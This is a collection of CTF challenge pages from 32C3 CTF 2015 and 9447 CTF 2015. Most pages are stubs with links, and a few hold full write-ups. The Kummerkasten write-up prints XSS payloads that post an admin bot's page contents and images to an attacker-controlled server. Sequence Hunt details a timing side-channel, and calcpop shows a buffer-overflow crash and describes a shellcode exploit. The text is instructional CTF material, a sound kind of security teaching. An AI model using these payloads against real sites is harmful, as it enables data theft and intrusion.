
> In case you want to test some shellcode you wrote, feel free to use this.
> 
> 
> nc 136.243.194.42 1024


## Write-up

(TODO)

## Other write-ups and resources

* http://tukan.farm/2016/01/13/32C3-CTF-sandbox-writeup/
* [GoN (Korean)](http://gon.kaist.ac.kr/?cat=47)
* <https://rzhou.org/~ricky/32c3/sandbox/>
* <http://pastebin.com/25zcAaWd>
# 32C3 CTF 2015 : teufel

**Category:** Pwn
**Points:** 200
**Solves:** 54
**Description:**

> teufel is running at 136.243.194.41:666
>
>
> Da ist der Teufel los


## Write-up

(TODO)

## Other write-ups and resources

* <http://nandynarwhals.org/2015/12/31/32c3ctf-teufel-pwn-200/>
* <http://v0ids3curity.blogspot.in/search/label/32C3%20CTF?m=0>
* <https://www.youtube.com/watch?v=wDosab_Y4Hs>
* <http://ebfe.dk/ctf/2016/01/06/32c3-teufel/>
* [Japanese](http://solorab.net/blog/2016/01/02/32c3-ctf-teufel/)
* <http://pastebin.com/XAM9xfYU>
# 32C3 CTF 2015 : tree

**Category:** Pwn
**Points:** 500
**Solves:** 4
**Description:**

> Manage your dom like data with this tool, unfortunately you can not currently export your data, feature will be added soon!
> 
> 
> nc 136.243.194.39 1024


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/scwuaptx/CTF/blob/master/2015-writeup/32c3/tree.py>
# 32C3 CTF 2015 write-ups

* <https://32c3ctf.ccc.ac/>
* [Scoreboard](https://32c3ctf.ccc.ac/scoreboard/) or [local alternative](./scoreboard)
* Number of participants with point > 0: 389

## Completed write-ups

* [forensics/config-bin-150](forensics/config-bin-150)
* [misc/gurke-300](misc/gurke-300)
* [pwn/forth-150](pwn/forth-150)
* [pwn/readme-200](pwn/readme-200)
* [web/kummerkasten-300](web/kummerkasten-300)
* [web/sequence-hunt-200](web/sequence-hunt-200)

## External write-ups only

* [embedded/blobberry-300](embedded/blobberry-300)
* [embedded/hd44780-150](embedded/hd44780-150)
* [embedded/nordicbynature-400](embedded/nordicbynature-400)
* [embedded/traces-200](embedded/traces-200)
* [forensics/the-300](forensics/the-300)
* [misc/aes-250](misc/aes-250)
* [misc/vault-400](misc/vault-400)
* [pwn/bingo-500](pwn/bingo-500)
* [pwn/cryptmsg-400](pwn/cryptmsg-400)
* [pwn/docker-250](pwn/docker-250)
* [pwn/ranger-400](pwn/ranger-400)
* [pwn/sandbox-300](pwn/sandbox-300)
* [pwn/teufel-200](pwn/teufel-200)
* [pwn/tree-500](pwn/tree-500)
* [reversing/carder-500](reversing/carder-500)
* [reversing/ey-or-150](reversing/ey-or-150)
* [reversing/flash-300](reversing/flash-300)
* [reversing/libdroid-150](reversing/libdroid-150)
* [reversing/pica-300](reversing/pica-300)
* [web/itd-150](web/itd-150)
* [web/monkeybase-200](web/monkeybase-200)
* [web/tinyhosting-250](web/tinyhosting-250)

## Missing write-ups# 32C3 CTF 2015 : carder

**Category:** Reversing
**Points:** 500
**Solves:** 2
**Description:**

> Here is the firmware of a smartcard for DVB-T decryption.
> 
> 
> Unfortunately the EEPROM data is missing, can you still decrypt the DVB-T stream?
> 
> 
> The flag begins with "32C3_" (uppercase).
> 
> 
> Hints:
> 
> This could help: <https://32c3ctf.ccc.ac/uploads/smartcard-075e52e6b925b3af7d78c781f2bd208384e26dbc.jpg>


## Write-up

(TODO)

## Other write-ups and resources

* [Sourcecode and eepron random data](http://shells.aachen.ccc.de/~spq/carder_infos.tar.gz)
* [http://mitega.github.io/write-ups/32C3_CTF/carder/](http://mitega.github.io/write-ups/32C3_CTF/carder/) (spanish and english write-up)
# 32C3 CTF 2015 : ey or

**Category:** Reversing
**Points:** 150
**Solves:** 30
**Description:**

> This binary contains a flag, extract it!


## Write-up

(TODO)

## Other write-ups and resources

* <http://blukat29.github.io/2015/12/32c3ctf-ey_or/>
# 32C3 CTF 2015 : flash

**Category:** Reversing
**Points:** 300
**Solves:** 49
**Description:**

> This firmware image is secured against manipulation using RSA and MD5. Can you still get around that protection?
> 
> 
> The service is available here <http://136.243.194.37:8001/upload.py.>


## Write-up

(TODO)

## Other write-ups and resources

* <http://nusgreyhats.org/write-ups/32C3-CTF-Flash-(Reversing-300)/>
* <http://pastebin.com/xrUrAZHY>
# 32C3 CTF 2015 : libdroid

**Category:** Reversing
**Points:** 150
**Solves:** 17
**Description:**

> Please install this on your new android phone, enter pass code and get the flag.
> 
> 
> Hints:
> 
> Updated the libdroid.apk, this one is now also able to run on a device. No changes to internal logic.


## Write-up

(TODO)

## Other write-ups and resources

* <http://yous.be/2015/12/30/32c3-ctf-2015-libdroid-write-up/>
* <http://blog.squareroots.de/en/2016/01/32c3-ctf-android-reverse-engineering-libdroid/>
# 32C3 CTF 2015 : PICA

**Category:** Reversing
**Points:** 300
**Solves:** 14
**Description:**

> [PICACHUUUUUUUUU!!!1!](https://mega.nz/#!7Y9AUTIS!tIC9yfIvZg-4BTojyKUfgiUP5E_Or6m-HBZBwiMIHok)
> 
> 
> If you switch to VTY2, you can log in as root without a password.
> 
> 
> Note: Please use the supplied qemu. I'm not sure if everything works if you use a different version. The qemu was compiled under Ubuntu 14.04.


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.l4ys.tw/2016/01/32c3-ctf-pica/)
# 32C3 CTF 2015 : ITD

**Category:** Web
**Points:** 150
**Solves:** 11
**Description:**

> Im Too Damn good at security. You can never beat me. Accept your fate. cross your fingers for this task to not collapse <http://136.243.194.59/>


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://blog.objc.jp/?p=2294)
* <http://pastebin.com/DQXxCM23>
* <http://pastebin.com/TG3x3Jz9>
* <http://pastebin.com/8XfDu51x>
* [Sourcecode by the task author](https://github.com/fearg0t/32c3_ITD)
# 32C3 CTF 2015 : Kummerkasten

**Category:** Web
**Points:** 300
**Solves:** 61
**Description:**

> Our Admin is a little sad this time of the year. Maybe you can cheer him up at this site <http://136.243.194.46/>
>
>
> Please note: This challenge does not follow the flag format.
>
>
> Hints:
>
> To build the flag, concatenate both parts and omit '32C3_'


## Write-up

by [0xBADCA7](https://github.com/0xBADCA7)

Strangely, this 32c3 CTF task weighted 300 points (while *ITD* was "only" 150) however it was a ~~simple~~ straightforward XSS. You're given a page like this: ![](http://i.imgur.com/7vUobWP.png)

*Your team* is nearly arbitrary (just a basic filter) and the injectable field is the message itself. It is possible to inject `<script src="yourstuff.js"></script>` right away. Clearly, there's a bot reading all the messages so the first thing right off the bat I did was to hook in [BeEF](http://beefproject.com/). The bot appeared in the logs shortly and then disconnected. I wasn't really disappointed as the original page already contained jQuery code so coding payloads would be a cakewalk.

First I dumped the current page the bot was seeing:

```javascript
$.post('http://myserver', {'a': btoa($('body')[0].innerHTML)})
```

The bot returned this:

```html
<script src="js/jquery-2.1.4.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;">
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">


      <div>
        <h1>Good news!</h1>
        <div class="comment">
            <blockquote>
                <p>lol<script>$.post('http://standard.io:4446', {'a': btoa($('body')[0].innerHTML)})</script></p></blockquote></div></div></div>
```

`document.cookie` was empty/inaccessible so I guessed the links in the top panel are way to go.  We have only `admin/token`, `admin/bugs` and `admin/comments`. I first fetched `admin/bugs` the same way:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="Admin">
    <meta name="author" content="The lonely admin">
    <link rel="icon" href="img/favicon.ico">

    <title>Admin</title>
    <base href="/">

    <link href="css/bootstrap.min.css" rel="stylesheet">

  </head>

  <body>

    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;"/>
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">

      <div class="row">
      <div class="col-md-6">
        <h1>Bug reports</h1>
        <div class="bug">
	    <p><h4>New bug report from Zero Cool on 2015-12-28</h4></p>
                <p>Hello Admin,...
		I know that you're not in a good place right now. I've been
		told to go easy on you. But guess what I just found browsing
		through the latest commits to our PUBLIC (!!!!) GitHub
		repository.
		</p>
		<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>
		<p>
        Is this really our production MySQL password? And is this by any chance
        the exact same password you're using everywhere else?  <br/>
		<b>Are you fucking kidding me?</b><br/>
        Please tell me that this is not also your password for the admin section...<br/>
        The only thing that luckily prevents anyone from exploiting this is
        that we enforce Two Factor Authentication. Even an imbecile
        like you can't fuck this up since it's only stored on your phone...<br/>
        Sorry admin, but this is unacceptable. I've deleted the checkin from
        the repo and I don't think anyone saw the commit...</p>
        <footer>Zero Cool on 2015-12-28</footer>
        </div>
        <hr/>
        <div class="bug">
	    <p><h4>New bug report from Acid Burn on 2015-12-20</h4></p>
            <blockquote>
                <p>Hello Admin,
        Sorry for filing a bug, but I thought this was the quickest way to
        reach you. I've found the library you were looking for, it's called
        pyotp. You haven't told me what you're planning on doing with it, but
        knowing you it will be something really cool. I've found that the
        easiest way to use the token is to just append it to your password
        (i.e. as the last six digits).</p>

		<p>I probably don't have to tell you to keep your TOTP token
		(and especially the seed) safe from prying eyes ;)</p>
                <footer>Acid Burn on 2015-12-20</footer>
            </blockquote>
        </div>
      </div>
      </div>
    </div>

  </body>
</html>

```

This is a clue that perhaps we need to take a look at the (potential) snapshot which is `<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>` and fetch some token as well. Looking into `admin/token` reveals:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="Admin">
    <meta name="author" content="The lonely admin">
    <link rel="icon" href="img/favicon.ico">

    <title>Admin</title>
    <base href="/">

    <link href="css/bootstrap.min.css" rel="stylesheet">

  </head>

  <body>

    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;"/>
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">

      <div>
        <h1>TOTP Token for today</h1>
        <p>
        The token for today is:<br/>
        <img src="admin/img/token.png?20151228" id="img-token"/>
        </p>
        </div>
      </div>
    </div>

  </body>
</html>
```

So we have two images of interest:

`<img src="admin/img/token.png?20151228" id="img-token"/>` and `<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>`. So I proceed with this code:

```javascript
var url                 = "/admin/img/root_pw.png?20151228";
var request             = new XMLHttpRequest();
request.open ("GET", url, true);
request.responseType    = "arraybuffer";
request.send(null);

setTimeout(function(){

	var blob = new Blob([request.response], {type: "image/png"});
	var oReq = new XMLHttpRequest();
	oReq.open("POST", "http://myserver", true);
	oReq.send(blob);

}, 4000)
```

On my server, all this time, I'm just using netcat (yes, eponym) and feeding it an [HTTP response](https://gist.github.com/0xBADCA7/9829ec7f3364fd0b165e) with CORS headers, otherwise any modern browser would halt the request:

```http
HTTP/1.1 200 OK
Server: MSLC
Date: Sun, 28 Dec 2015 08:50:04 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Status: 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, PUT

```

```http
HTTP/1.1 200 OK
Server: MSLC
Date: Sun, 28 Dec 2015 08:50:04 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Status: 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, PUT
```

One is for the `OPTIONS` request and another is the answer itself.

The bot was apparently down for a while but then I saw a callback in the terminal in the middle of the night with the good news - both images arrived. As the request was raw and I did not base64 it I just ran `binwalk` on it and extracted the PNGs:

![](http://i.imgur.com/6umTaWx.png)
----

![](http://i.imgur.com/yUNbloa.png)

As the task was saying that the format of the flag is not of the standard form I concatenated the token with the password and it went through.


## Other write-ups and resources

* <https://github.com/andihit/ctf-write-ups/blob/master/2015/32c3/kummerkasten.md>
* <http://breaking.into.systems/2015/12/29/32c3ctf-kummerkasten-writeup/>
* <http://nandynarwhals.org/2015/12/31/32c3ctf-kummerkasten-web-300/>
# 32C3 CTF 2015 : Monkeybase

**Category:** Web
**Points:** 200
**Solves:** 26
**Description:**

> A group of highly trained monkeys from outer space have been using earthlings technology to communicate ( over the web ). we want to know their secrets and intentions so we infiltrated them. Here's their platform of communication and an invite key:
> 
> 
> <http://136.243.194.35/>
> 
> 
> invite key: d991065ab84307e7904e2b9b515a2d69


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://blog.objc.jp/?p=2294)
# 32C3 CTF 2015 : Sequence Hunt

**Category:** Web
**Points:** 200
**Solves:** 19
**Description:**

> May we interest you in a little programming exercise?
> 
> 
> <http://136.243.194.36:18888>

This is what we see opening: http://136.243.194.36:18888/
```
Sequence Hunt

Welcome to my integer sequence hunt. You have to compute five numbers between 0 and 100 implementing 
the algorithms below. When you think you have a correct solution, send them as GET parameters here. 
You can also get some info about you here.
I expect a lot of load, so I built this around async IOLoops.
Have Fun!

[EDIT] 
Someone sent me this. Since each check takes considerable time, the server now waits until 
three seconds have passed since the request came in to prevent these attacks. 
[/EDIT]

Algorithms

TODO publish algorithms
```

Opening http://136.243.194.36:18888/info we get
```
you are 37.120.106.140
request count on your IOLoop: 1
```


## Write-up

by [grnd](https://github.com/grnd)

We got the following urls 
- http://136.243.194.36:18888/ - shows us the info (above)
- http://136.243.194.36:18888/check - lets us submit 5 values
- http://136.243.194.36:18888/info - shows the io loop count

The author hinted us that there's a protection against timing attacks, making each request wait until 3 seconds has passed.
And indeed, we see that it take about 3 seconds for `check` request to return, regardless of the values we provide.
```
$ time curl "http://136.243.194.36:18888/check?val0=1&val1=1&val2=1&val3=1&val4=1"
you are 37.120.106.140<br>At least one value is wrong!
0.00s user 
0.01s system 
0% cpu 
3.174 total
```

We also notice that each `check` request increaces the IOLoop count, and so does the `info` request itself. 

Sending `check` requests with various random numbers does not give us any statistically significant differences in timing.
But sending an `info` request while there's an outstanding `check` request shows significant timing side-effect.
This is because the secret algorithm blocks the IO loop, and thus blocks any further requests. 

To better understand what happens, here's a sample node js code. (run with `$ node ser.js`)

```
var http = require('http');
var url = require('url');

// event loop blocking sleep
function sleep(s) {
  var e = new Date().getTime() + s;
  while (new Date().getTime() <= e) {;}
}

var TimingAttackProtectionSeconds = 3;

var IOLoopCounter = 0;

http.createServer(function(request, response) {
  var u = url.parse(request.url, true);

  IOLoopCounter++;

  if (u.path.indexOf('/info') == 0) {
    response.writeHeader(200, {'Content-Type': 'text/html'});
    response.write('IOLoop: ' + IOLoopCounter);
    response.end();

  } else if (u.path.indexOf('/check') == 0) {
    // simulate some algo
    console.log('working hard on our input ' + JSON.stringify(u.query));

    // sleep for 0-3 secs
    var secsZzzz = Math.random() * 3;
    sleep(secsZzzz * 1000);

    // "prevent" the timing attack. wait until 3 seconds pass
    setTimeout(function() {
      response.writeHeader(200, {'Content-Type': 'text/html'});
      response.write('Blocked IO loop for: ' + secsZzzz.toFixed(2) + 's</br>');
      response.write('Total request time: ' + TimingAttackProtectionSeconds + 's</br>');
      response.end();
    }, (TimingAttackProtectionSeconds - secsZzzz) * 1000);

  }
}).listen(8080);

console.log('Server running at http://localhost:8080/');
```

What's important to see is that the sleep function blocks node's event loop (thus blocking further requests to /info), 
while the setTimeout does not, it just sends the response back asyncronically, as soon as we reach 3 seconds in total.

So now all we need to do is to send a `check` request and without waiting for the response, send an `info` request, measuring the time it takes for it to return. 
To automate the search process, and cancel out network gitter, next step was to write a python script that given a set of inputs, opens `n` threads, sends a `check` request and measures the time it takes for `info` request to return, averages the times and returns the result. I used n=5, and it proved to be enough. But it might be bigger depending on the quality of the internet connection.

Here are the results from the first run. note the significant difference with the value `4`
```
[0, 0, 0, 0, 0]: 0.4933500289916992
[1, 1, 1, 1, 1]: 0.3603970050811768
[2, 2, 2, 2, 2]: 0.42971043586730956
[3, 3, 3, 3, 3]: 0.47055706977844236
[4, 4, 4, 4, 4]: 0.9154952526092529 <<<<<<<<<
[5, 5, 5, 5, 5]: 0.46373558044433594
[6, 6, 6, 6, 6]: 0.35578303337097167
[7, 7, 7, 7, 7]: 0.441812801361084
[8, 8, 8, 8, 8]: 0.4297045707702637
```

Above difference in timing appeared only when 4 was in the first possition, so the next step was to enumerate over the rest parameters.
Second digit was found to be `12` 
```
[4, 10, 10, 10, 10]: 0.8408413887023926
[4, 11, 11, 11, 11]: 0.8593394994735718
[4, 12, 12, 12, 12]: 1.228700304031372 <<<<<<<
[4, 13, 13, 13, 13]: 0.9078318119049072
```

Third `77`
```
[4, 12, 73, 73, 73]: 1.442296075820923
[4, 12, 74, 74, 74]: 1.2971014022827148
[4, 12, 75, 75, 75]: 1.273622751235962
[4, 12, 76, 76, 76]: 1.0751570224761964
[4, 12, 77, 77, 77]: 1.9099168300628662 <<<<<<<<<<
[4, 12, 78, 78, 78]: 1.0117467403411866
[4, 12, 79, 79, 79]: 1.2718517780303955
[4, 12, 80, 80, 80]: 1.4834677696228027
```

And so on, until we got to all the params and the [flag](http://136.243.194.36:18888/check?val0=4&val1=12&val2=77&val3=98&val4=35) `[4, 12, 77, 98, 35]`

```
$ curl 'http://136.243.194.36:18888/check?val0=4&val1=12&val2=77&val3=98&val4=35'
you are 37.120.106.140
Congratulations, here is your price:
32C3_round_and_round_and_round_IT_goes
```

## Other write-ups and resources

* none yet
# 32C3 CTF 2015 : TinyHosting

**Category:** Web
**Points:** 250
**Solves:** 71
**Description:**

> A new file hosting service for very small files. could you pwn it?
>
>
> <http://136.243.194.53/>


## Write-up

(TODO)

## Other write-ups and resources

* <http://wget.pw/posts/32c3-ctf-tinyhosting-web-250>
* <https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/tiny_hosting_web_250#eng-version>
* <http://nandynarwhals.org/2015/12/31/32c3ctf-tinyhosting-web-250/>
* <http://pastie.org/private/zwyrzppamomihzwjixpcla>
* <http://pastie.org/private/cux8flyorujmupak2g>
* <http://pastebin.com/mkaAnDf4>
# 9447 CTF 2015: dub-key

**Category:** Crypto
**Points:** 130
**Solves:** 54
**Description:**

> My friend set up a small signing scheme, however she won't let me sign stuff. Can you get it signed?
> 
>  Find it at dub-key-t8xd5pn6.9447.plumbing port 9447
> 
> [dub-key.tar.gz](dub-key-ab9f970aa1ae119fc486e88e15c859a6.tar.gz)  ab9f970aa1ae119fc486e88e15c859a6


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/e8104c307426dbeb8081a2f8b08200e7182e9db8/9447ctf2015/crypto130-dub-key>
* <https://github.com/p4-team/ctf/tree/master/2015-11-28-9447/dub-key#eng-version>
* <http://ohaithe.re/post/134557184717/dubkey-wobkey-writeup-9447-ctf>
* <https://losfuzzys.github.io/writeup/2015/12/07/9447ctf-dubkey/>
# 9447 CTF 2015: Fibbed

**Category:** Crypto
**Points:** 310
**Solves:** 16
**Description:**

> Some secret communication was captured, and we're having trouble decrypting it. Can you help?
>
> [fibbed.tar.gz](fibbed-8dd4a5aaa344d1e203069a24a7afed0f.tar.gz)  8dd4a5aaa344d1e203069a24a7afed0f


## Write-up

(TODO)

## Other write-ups and resources

* <http://hxp.io/blog/22/9447%20CTF%202015:%20crypto310%20%22Fibbed%22%20writeup/>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/crypto310-fibbed>
* <http://www.gnoobz.com/9447-ctf-2015-fibbed-writeup.html>
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/Fibbed/75/)
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>

# 9447 CTF 2015: randBox

**Category:** Crypto
**Points:** 120
**Solves:** 94
**Description:**

> Find your random black box here:
>
> randBox-iw8w3ae3.9447.plumbing port 9447
>
> Note that the order of challenges has changed as of about 2015-11-28 23:00 UTC


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-11-28-9447/randBox#eng-version>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/crypto120-randbox>
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/randBox/78/)
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>
# 9447 CTF 2015: wob-key

**Category:** Crypto
**Points:** 190
**Solves:** 20
**Description:**

> My friend won't believe that I signed it, and is now challenging me to sign anything she throws at me! Can you beat it?
> 
> Find it at wob-key-e1g2l93c.9447.plumbing port 9447
> 
> [wob-key.tar.gz](../wob-key-hard/wob-key-f5ad5269e4899e3da5de684fb842a858.tar.gz)  f5ad5269e4899e3da5de684fb842a858


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/e8104c307426dbeb8081a2f8b08200e7182e9db8/9447ctf2015/crypto320-wob-key>
* <http://ohaithe.re/post/134557184717/dubkey-wobkey-writeup-9447-ctf>
# 9447 CTF 2015: wob-key-hard

**Category:** Crypto
**Points:** 130
**Solves:** 18
**Description:**

> Do it without raising any suspicion!
>
>  Find it at wob-key-e1g2l93c.9447.plumbing port 9447
>
> [wob-key.tar.gz](wob-key-f5ad5269e4899e3da5de684fb842a858.tar.gz)  f5ad5269e4899e3da5de684fb842a858


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/e8104c307426dbeb8081a2f8b08200e7182e9db8/9447ctf2015/crypto320-wob-key>
* <http://ohaithe.re/post/134557184717/dubkey-wobkey-writeup-9447-ctf>
# 9447 CTF 2015: BWS

**Category:** Exploitation
**Points:** 190
**Solves:** 29
**Description:**

> My friend has been playing that annoying song far too long. Can you own his web server now?
> 
> The web page is at <http://bws-ad8sfsklw.9447.plumbing>
> 
> [bws](./bws-0a1effb16b7c9123fc28a768317b9956)  0a1effb16b7c9123fc28a768317b9956


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-03-bws-md>
* <https://gist.github.com/securifera/0c909a456fbe88059c36>
* [sophia.re](http://www.sophia.re/94472015_bws_writeup.html) (look at root page)
* <https://kt.pe/blog/2015/12/9447ctf-2015-quals/>
# 9447 CTF 2015: calcpop

**Category:** Exploitation
**Points:** 80
**Solves:** 174
**Description:**

> See if you can pop *this* calc.
>
> Running at calcpop-4gh07blg.9447.plumbing port 9447
>
> [calcpop.tar.gz](./calcpop-42928687007cc7a92fc0ac6028cf8f64.tar.gz)  42928687007cc7a92fc0ac6028cf8f6


## Write-up

by [f0rki](https://github.com/f0rki)

We can connect to the challenge and send it two numbers, which it will add for
us. If we send something without a space, it will tell us the address of
our input, because instead of `%s` there is a `%p` in the format string:
```
Missing a space; your input was %p\n
```
Such a nice a infoleak. After some poking around I found that it is a straight
forward stack based buffer overflow:
```
$ python -c 'import sys; sys.stdout.write("A"*256)' | nc calcpop-4gh07blg.9447.plumbing 9447
Welcome to calc.exe
Missing a space; your input was 0xff8b44d0
Missing a space; your input was 0xff8b44d0
timeout: the monitored command dumped core
/usr/local/bin/ctf_wrapper.sh: line 6: 13607 Segmentation fault      timeout 300 $1 $2
```
Also using checksec we can see that `NX` is disabled.
```
$ checksec --file calcpop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   calcpop
```
Yeah exploitation like it's the 90's. So we put shellcode on the stack and
overwrite the return address with the address we got from the infoleak. This is
pretty straightforward using a pwntools script.
[Here is the exploit.](exploit.py)


`9447{shELl_i5_easIEr_thaN_ca1c}`


## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn80-calcpop>
* <https://gist.github.com/emyei/97e22ee467fef6c97119>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-01-calcpop-md>
* [Spanish](http://mumei.strangled.net/post/4)
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/calcpop/76/)
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html>
* <https://losfuzzys.github.io/writeup/2015/12/07/9447ctf-calcpop/>
# 9447 CTF 2015: calpop-reloaded

**Category:** Exploitation
**Points:** 130
**Solves:** 39
**Description:**

> I heard someone owned my calculator, so I've decided to port it to a more secure OS.
> 
> I've also added some proof of work, I'm sure that will stop the hackers!
> 
> Find it at os-uedhyevi.9447.plumbing port 9447
> 
> The flag is in /ctf
> 
> Hint! Try to get a shell. The flag is NOT in flag.txt, it's somewhere else.
> 
> [calcpop-reloaded.bin](./calcpop-reloaded-c76066c702c600b0240fd278f561e3ef.bin)  c76066c702c600b0240fd278f561e3ef


## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.0x80.org/calc/>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-04-calpop-reloaded-md>
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html>
* <http://www.g0liath.com/> (down)
* <https://kt.pe/blog/2015/12/9447ctf-2015-quals/>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-04-calpop-reloaded-md>
# 9447 CTF 2015: cards

**Category:** Exploitation
**Points:** 140
**Solves:** 45
**Description:**

> We have released a new card game! If you win, you get a flag.
> 
> Check it out at cards-6xvx9tsi.9447.plumbing port 9447
> 
> [cards.tar.gz](./cards-0a8ad59b78ee1f72c4739f69d598fcd8.tar.gz)  0a8ad59b78ee1f72c4739f69d598fcd8


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn140-cards> (Common and detailed understanding)
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-02-cards-md> (Terminology, more understanding)
* <https://www.whitehatters.academy/9447-ctf-exploit-cards/> (Thought process)
* <https://wiki.inpt.fr/ctf:public:9447:cards> or <https://pony7.fr/ctf:public:9447:cards> (Print gdb stack at shuffle)
* <http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-cards/> (Two complement, coolest exploit script)
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html> (More detailed understanding)

### Meta

Keywords:

* Integer Overflow `io` (or Underflow?)

We are given a gzipped tar archive containing the following

* A x86-64bit non-stripped ELF for Linux named `cards`:
```bash
$ file cards
cards: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=7bce28e26cfcb1a331fae514e91b54a855e610e1, not stripped
```
* C Source Code for the provided binary named [`cards.c`](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c)
* A Makefile to create said binary by compiling `cards.c`

The first thing that we do is have a look at the source code to see that we have to provide a flag file named `flag.txt`: `echo '9447{ThE_Only_w1nn1Ng_M0ve_1S_t0_stEAl_The_flAg}' > flag.txt`.

Running the binary:

```bash
$ ./cards 
Lets play a game!
Enter up to 52 cards (0 to stop):
1337
42
1
2
0
Here are your cards left:
1 2 1337 42 
Enter the index of the card to play:
2
You played 1337, I played 1
You won!
Here are your cards left:
1 2 (-) 42 
Enter the index of the card to play:
1
You played 2, I played 42
I won!
Here are your cards left:
